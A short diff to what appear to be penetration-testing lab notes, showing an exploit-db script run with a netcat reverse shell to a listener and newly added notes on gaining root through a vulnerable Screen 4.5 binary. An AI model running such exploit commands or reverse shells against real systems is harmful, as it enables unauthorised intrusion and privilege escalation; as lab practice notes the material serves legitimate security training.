@@ -58,7 +58,8 @@ Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 3. ``` python3 49067.py --ahost 192.168.181.143 --aport 3000 --netcatshell --lhost=192.168.45.204 --lport=80 ```
 
 ## Root
-1. 
+1. found screen 4.5 vulnable (https://www.exploit-db.com/exploits/41154)
+2. follow the exploit: https://github.com/jebidiah-anthony/htb_flujab (part 4)
 
 # Crystal .144
 ```
